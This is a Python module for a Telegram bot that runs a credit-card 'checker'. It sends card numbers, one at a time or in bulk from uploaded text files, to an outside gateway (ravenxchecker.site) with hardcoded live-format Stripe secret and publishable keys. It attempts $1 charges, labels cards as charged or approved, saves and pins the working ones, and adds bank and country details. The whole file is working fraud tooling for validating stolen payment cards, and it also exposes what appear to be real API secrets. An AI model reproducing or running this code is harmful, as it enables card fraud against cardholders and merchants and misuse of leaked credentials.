# sq_commands.py

from telethon import events, Button
import asyncio
import aiohttp
import json
import time
import os
import re

# --- Globals ---
client = None
utils = {}
ACTIVE_MSQTXT_PROCESSES = {}

# --- API Configuration ---
SK_KEY = "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"
PK_KEY = "pk_live_51QuMQyFFXXyXZOvgkBdCd4rvxl6TUW7f8GrF33AiWxQXCcNaHpc8TAjoj5FgoJlBOqOZD6XuBozhBuA6FWZq3Wbi00ATd45WZb"
AMOUNT = "100" # Represents 1.00$
API_ENDPOINT = "https://ravenxchecker.site/check/skb.php"

# --- Core API Function ---
async def check_sq_api(card):
    """Makes a request to the Stripe SK Based gateway."""
    try:
        url = f"{API_ENDPOINT}?sk={SK_KEY}&pk={PK_KEY}&amount={AMOUNT}&lista={card}"
        timeout = aiohttp.ClientTimeout(total=60)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return {"status": "Error", "message": f"API HTTP Error {res.status}"}
                
                response_text = await res.text()
                response_text_lower = response_text.lower()
                try:
                    data = json.loads(response_text)
                    
                    # --- Success / Charged Conditions ---
                    if data.get("ok") or 'charge' in data.get("full", {}) or data.get("status") == "succeeded":
                        message = data.get("full", {}).get("outcome", {}).get("seller_message", "Payment successful.")
                        return {"status": "Charged", "message": message}

                    # --- 3D Secure Condition ---
                    error_msg = data.get("error", "").lower()
                    decline_code = data.get("full", {}).get("error", {}).get("decline_code", "").lower()
                    if "authentication_required" in decline_code or "3d_secure" in error_msg:
                        return {"status": "Declined", "message": "3D Secure Required"}

                    # --- Approved / CCN Live Conditions ---
                    if "incorrect_cvc" in decline_code or "security code is incorrect" in error_msg or "insufficient_funds" in decline_code or "insufficient funds" in error_msg:
                        return {"status": "Approved", "message": data.get("error")}

                    # --- Generic Decline ---
                    return {"status": "Declined", "message": data.get("error", "Unknown Decline")}

                except json.JSONDecodeError:
                    # Fallback for non-JSON responses (like HTML pages or simple text)
                    if "succeeded" in response_text_lower or "ch_" in response_text_lower or "payment successful" in response_text_lower:
                         return {"status": "Charged", "message": "Payment Successful (Non-JSON)"}
                    if "3d secure" in response_text_lower or "authentication required" in response_text_lower:
                        return {"status": "Declined", "message": "3D Secure Required"}
                    if "incorrect_cvc" in response_text_lower or "security code is incorrect" in response_text_lower or "insufficient_funds" in response_text_lower:
                        return {"status": "Approved", "message": "Incorrect Security Code"}
                    
                    error_snippet = response_text.strip().replace('\n', ' ')[:100] # Get the first 100 chars
                    return {"status": "Error", "message": f"Invalid Response: {error_snippet}"}

    except asyncio.TimeoutError:
        return {"status": "Error", "message": "Request Timed Out"}
    except Exception as e:
        return {"status": "Error", "message": str(e)}

# --- Single Check (/sq) ---
async def process_sq_card(event):
    """Processes a single card check for /sq command."""
    card = utils['extract_card'](event.raw_text)
    if not card:
        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            if replied_msg and replied_msg.text:
                card = utils['extract_card'](replied_msg.text)
    
    if not card:
        return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩 ➜ /𝙨𝙦 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤")

    loading_msg = await event.reply("🍳")
    start_time = time.time()

    res = await check_sq_api(card)
    end_time = time.time()
    elapsed_time = round(end_time - start_time, 2)
    
    brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
    
    status = res.get("status")
    if status == "Charged":
        status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
        await utils['save_approved_card'](card, "CHARGED (SQ)", res.get('message'), "Stripe SK 1$", "1.00$")
    elif status == "Approved":
        status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
        await utils['save_approved_card'](card, "APPROVED (SQ)", res.get('message'), "Stripe SK 1$", "N/A")
    elif status == "Declined":
        status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
    else: # Handles "Error"
        status_header = "𝙀𝙍𝙍𝙊𝙍 ⚠️"

    msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe SK Based 1$
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {res.get('message')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝗸 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"""
    
    await loading_msg.delete()
    result_msg = await event.reply(msg)
    if status == "Charged":
        await utils['pin_charged_message'](event, result_msg)

# --- Mass Check (/msq) ---
async def process_msq_cards(event, cards):
    """Processes multiple cards for /msq command."""
    sent_msg = await event.reply(f"```𝙎𝙤𝙢𝙚𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 {len(cards)} 𝙏𝙤𝙩𝙖𝙡.```")
    
    for card in cards:
        res = await check_sq_api(card)
        status = res.get("status")
        
        # Determine status header and save card if it's a hit
        if status == "Charged":
            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
            await utils['save_approved_card'](card, "CHARGED (SQ)", res.get('message'), "Stripe SK 1$", "1.00$")
        elif status == "Approved":
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            await utils['save_approved_card'](card, "APPROVED (SQ)", res.get('message'), "Stripe SK 1$", "N/A")
        elif status == "Declined":
            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
        else: # Handles "Error"
            status_header = "𝙀𝙍𝙍𝙊𝙍 ⚠️"

        # Get BIN info for all cards
        brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
        
        # Construct and send the message for EVERY card
        card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe SK Based 1$
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {res.get('message')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```"""
        
        result_msg = await event.reply(card_msg)
        
        # Pin the message if charged
        if status == "Charged":
            await utils['pin_charged_message'](event, result_msg)

        await asyncio.sleep(0.5) # Prevent rate-limiting
        
    await sent_msg.edit(f"```✅ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚! 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 {len(cards)} 𝙘𝙖𝙧𝙙𝙨.```")


# --- Mass Text File Check (/msqtxt) ---
async def process_msqtxt_cards(event, cards):
    """Processes cards from a text file for /msqtxt command."""
    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    status_msg = await event.reply("```𝙎𝙤𝙢𝙚𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```")
    
    try:
        batch_size = 15 # Process cards concurrently in batches
        for i in range(0, len(cards), batch_size):
            if user_id not in ACTIVE_MSQTXT_PROCESSES: break
            
            batch = cards[i:i+batch_size]
            tasks = [check_sq_api(card) for card in batch]
            results = await asyncio.gather(*tasks)

            for card, res in zip(batch, results):
                if user_id not in ACTIVE_MSQTXT_PROCESSES: break
                
                checked += 1
                status = res.get("status")
                
                if status == "Charged":
                    charged += 1
                    status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                    await utils['save_approved_card'](card, "CHARGED (SQ)", res.get('message'), "Stripe SK 1$", "1.00$")
                elif status == "Approved":
                    approved += 1
                    status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                    await utils['save_approved_card'](card, "APPROVED (SQ)", res.get('message'), "Stripe SK 1$", "N/A")
                else:
                    declined += 1
                    status_header = ""

                # Only send a message for hits
                if status_header:
                    brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
                    card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe SK Based 1$
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {res.get('message')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```"""
                    result_msg = await event.reply(card_msg)
                    if status == "Charged":
                        await utils['pin_charged_message'](event, result_msg)
                
                # Update status message with buttons
                buttons = [
                    [Button.inline(f"𝗖𝘂𝗿𝗿𝗲𝗻𝘁 ➜ {card[:12]}****", b"none")],
                    [Button.inline(f"𝙎𝙩𝙖𝙩𝙪𝙨 ➜ {res.get('message', '')[:25]}...", b"none")],
                    [Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")],
                    [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] ✅", b"none")],
                    [Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")],
                    [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] 🔥", b"none")],
                    [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_sq_msqtxt:{user_id}".encode())]
                ]
                try:
                    await status_msg.edit("```𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...```", buttons=buttons)
                except: pass # Ignore message not modified errors
            await asyncio.sleep(0.5)

        # Final Status Update
        final_caption = f"""✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!

𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅ : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 🔥 : {total}
"""
        await status_msg.edit(final_caption, buttons=None)

    finally:
        ACTIVE_MSQTXT_PROCESSES.pop(user_id, None)

# --- Event Handler Functions ---
async def sq_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        if access_type == "banned":
            return await event.reply(utils['banned_user_message']())
        else:
            message, buttons = utils['access_denied_message_with_button']()
            return await event.reply(message, buttons=buttons)
    asyncio.create_task(process_sq_card(event))

async def msq_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        if access_type == "banned":
            return await event.reply(utils['banned_user_message']())
        else:
            message, buttons = utils['access_denied_message_with_button']()
            return await event.reply(message, buttons=buttons)
    
    text_to_check = ""
    if event.is_reply:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            text_to_check = replied_msg.text
    else:
        text_to_check = event.raw_text

    cards = utils['extract_all_cards'](text_to_check)
    
    if not cards:
        return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙨𝙦 5414...|01|25|123 5414...|02|26|321")
    
    limit = 20
    if len(cards) > limit:
        original_count = len(cards)
        cards = cards[:limit]
        await event.reply(f"⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 {limit} 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {original_count}. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 {limit}.")
        
    asyncio.create_task(process_msq_cards(event, cards))

async def msqtxt_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        if access_type == "banned":
            return await event.reply(utils['banned_user_message']())
        else:
            message, buttons = utils['access_denied_message_with_button']()
            return await event.reply(message, buttons=buttons)
    
    user_id = event.sender_id
    if user_id in ACTIVE_MSQTXT_PROCESSES:
        return await event.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")
        
    if not event.is_reply:
        return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 .𝙩𝙭𝙩 𝙛𝙞𝙡𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙨𝙦𝙩xt```")
    
    replied_msg = await event.get_reply_message()
    if not replied_msg or not replied_msg.document:
        return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 .𝙩xt 𝙛𝙞𝙡𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙨𝙦𝙩𝙭𝙩```")
    
    file_path = None
    try:
        file_path = await replied_msg.download_media()
        with open(file_path, "r", encoding='utf-8', errors='ignore') as f:
            lines = f.read().splitlines()
    except Exception as e:
        return await event.reply(f"Error reading file: {e}")
    finally:
        if file_path and os.path.exists(file_path):
            os.remove(file_path)

    cards = [line for line in lines if re.match(r'\d{12,16}[|\s/]*\d{1,2}[|\s/]*\d{2,4}[|\s/]*\d{3,4}', line)]
    if not cards:
        return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
        
    cc_limit = utils['get_cc_limit'](access_type, user_id)
    original_count = len(cards)
    if original_count > cc_limit:
        cards = cards[:cc_limit]
        await event.reply(f"⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 𝙤𝙪𝙩 𝙤𝙛 {original_count} (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩).")
    
    ACTIVE_MSQTXT_PROCESSES[user_id] = True
    asyncio.create_task(process_msqtxt_cards(event, cards))

async def stop_msqtxt_callback(event):
    """Callback for the stop button in /msqtxt."""
    try:
        process_user_id = int(event.pattern_match.group(1).decode())
        clicking_user_id = event.sender_id
        
        can_stop = (clicking_user_id == process_user_id) or (clicking_user_id in utils['ADMIN_ID'])
        if not can_stop:
            return await event.answer("❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!", alert=True)

        if process_user_id in ACTIVE_MSQTXT_PROCESSES:
            ACTIVE_MSQTXT_PROCESSES.pop(process_user_id)
            await event.answer("⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!", alert=True)
            try:
                await event.edit(event.message.text + "\n\n-- CHECKING STOPPED BY USER --", buttons=None)
            except: pass
        else:
            await event.answer("❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!", alert=True)
    except Exception as e:
        await event.answer(f"Error: {e}", alert=True)

# --- Registration Function ---
def register_handlers(_client, _utils):
    """Registers all the handlers and utilities from the main file."""
    global client, utils
    client = _client
    utils = _utils

    client.on(events.NewMessage(pattern=r'(?i)^[/.]sq'))(sq_command)
    client.on(events.NewMessage(pattern=r'(?i)^[/.]msq'))(msq_command)
    client.on(events.NewMessage(pattern=r'(?i)^[/.]msqtxt$'))(msqtxt_command)
    client.on(events.CallbackQuery(pattern=rb"stop_sq_msqtxt:(\d+)"))(stop_msqtxt_callback)
    print("✅ Successfully registered SQ, MSQ, MSQTXT commands.")